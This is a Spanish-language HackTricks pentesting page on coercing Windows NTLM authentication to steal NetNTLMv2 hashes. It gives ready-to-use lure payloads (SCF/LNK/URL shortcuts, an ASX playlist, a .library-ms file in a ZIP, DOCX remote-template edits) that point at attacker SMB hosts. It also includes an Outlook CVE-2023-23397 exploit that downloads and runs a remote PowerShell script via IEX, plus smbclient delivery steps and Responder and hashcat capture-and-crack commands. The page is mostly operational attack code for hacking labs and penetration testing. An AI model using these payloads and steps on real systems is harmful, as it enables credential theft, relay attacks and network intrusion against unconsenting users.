# Lugares para robar NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Revisa todas las excelentes ideas de [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) desde la descarga de un archivo microsoft word en línea hasta la ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md and [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Share SMB con permisos de escritura + lures UNC activados por Explorer (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Si puedes **escribir en un share que los usuarios o trabajos programados exploran en Explorer**, drop files cuyos metadatos apunten a tu UNC (p. ej. `\\ATTACKER\share`). Al renderizar la carpeta se desencadena la **autenticación SMB implícita** y leaks un **NetNTLMv2** a tu listener.

1. **Generar lures** (cubre SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Déjalos en el writable share** (cualquier carpeta que la víctima abra):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Escuchar y crackear**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows puede acceder a varios archivos a la vez; cualquier elemento que Explorer previsualice (`BROWSE TO FOLDER`) no requiere clics.

### Listas de reproducción de Windows Media Player (.ASX/.WAX)

Si puedes lograr que un objetivo abra o previsualice una lista de reproducción de Windows Media Player que controles, puedes leak Net‑NTLMv2 apuntando la entrada a una ruta UNC. WMP intentará recuperar el medio referenciado vía SMB y se autenticará implícitamente.

Ejemplo de payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Flujo de recopilación y cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### .library-ms NTLM leak embebido en ZIP (CVE-2025-24071/24055)

Windows Explorer maneja de forma insegura los archivos .library-ms cuando se abren directamente desde dentro de un archivo ZIP. Si la definición de la biblioteca apunta a una ruta UNC remota (p. ej., \\attacker\share), simplemente navegar/ejecutar el .library-ms dentro del ZIP hace que Explorer enumere la UNC y emita autenticación NTLM al attacker. Esto produce un NetNTLMv2 que puede ser cracked offline o potencialmente relayed.

Ejemplo mínimo de .library-ms que apunta a un UNC del attacker
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- Crea el archivo .library-ms con el XML anterior (configura tu IP/hostname).
- Comprime el archivo (on Windows: Send to → Compressed (zipped) folder) y entrega el ZIP al objetivo.
- Ejecuta un NTLM capture listener y espera a que la víctima abra el .library-ms desde dentro del ZIP.


### Ruta del sonido del recordatorio del calendario de Outlook (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows procesaba la propiedad MAPI extendida PidLidReminderFileParameter en elementos de calendario. Si esa propiedad apuntaba a una UNC path (p. ej., \\attacker\share\alert.wav), Outlook contactaba el share SMB cuando se activaba el recordatorio, provocando un leak del Net‑NTLMv2 del usuario sin necesidad de hacer click. Esto se parcheó el 14 de marzo de 2023, pero sigue siendo muy relevante para flotas legacy/untouched y para la respuesta a incidentes histórica.

Explotación rápida con PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Lado del Listener:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notas
- Una víctima solo necesita que Outlook for Windows esté ejecutándose cuando se active el recordatorio.
- El leak produce Net‑NTLMv2 adecuado para offline cracking o relay (no pass‑the‑hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer renderiza automáticamente los iconos de los accesos directos. Investigaciones recientes mostraron que, incluso después del parche de abril de 2025 de Microsoft para UNC‑icon shortcuts, todavía era posible desencadenar la autenticación NTLM sin hacer clic alojando el destino del acceso directo en una ruta UNC y manteniendo el icono local (patch bypass asignado CVE‑2025‑50154). Simplemente al ver la carpeta, Explorer recupera metadatos del destino remoto, enviando NTLM al servidor SMB del atacante.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Payload de acceso directo de programa (.lnk) mediante PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- Coloca el acceso directo en un ZIP y haz que la víctima lo explore.
- Coloca el acceso directo en un recurso compartido con permisos de escritura que la víctima abrirá.
- Combínalo con otros archivos señuelo en la misma carpeta para que Explorer previsualice los elementos.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office documents can reference an external template. If you set the attached template to a UNC path, opening the document will authenticate to SMB.

Cambios mínimos en las relaciones DOCX (inside word/):

1) Edita word/settings.xml y añade la referencia a la plantilla adjunta:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Edita word/_rels/settings.xml.rels y apunta rId1337 a tu UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Reempaqueta a .docx y entrega. Ejecuta tu SMB capture listener y espera a que se abra.

Para ideas post-captura sobre relaying o abuso de NTLM, consulta:

{{#ref}}
README.md
{{#endref}}


## Referencias
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
